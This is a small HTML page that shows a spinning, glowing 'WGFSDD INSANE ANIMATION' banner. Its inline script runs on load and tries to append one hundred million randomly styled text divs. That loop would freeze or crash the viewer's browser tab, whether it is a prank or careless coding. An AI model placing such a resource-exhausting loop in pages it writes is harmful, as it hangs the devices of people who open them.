<!DOCTYPE html>
<html>
<head>
  <title>WGFSDD INSANE ANIMATION</title>
  <style>
    body {
      background-color: #000;
      background-image: linear-gradient(to bottom, #000, #333);
    }
    .animation {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 96px;
      color: #fff;
      animation: spin 2s linear infinite;
      text-shadow: 2px 2px 5px #fff;
    }
    @keyframes spin {
      0% {
        transform: translate(-50%, -50%) rotate(0deg);
      }
      100% {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="animation">WGFSDD INSANE ANIMATION</div>
  <script>
    for (let i = 0; i < 100000000; i++) {
      const div = document.createElement('div');
      div.textContent = 'WGFSDD INSANE ANIMATION';
      div.style.position = 'absolute';
      div.style.top = `${Math.random() * 100}%`;
      div.style.left = `${Math.random() * 100}%`;
      div.style.fontSize = `${Math.random() * 96}px`;
      div.style.color = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
      div.style.textShadow = `2px 2px 5px #fff`;
      document.body.appendChild(div);
    }
  </script>
</body>
</html>
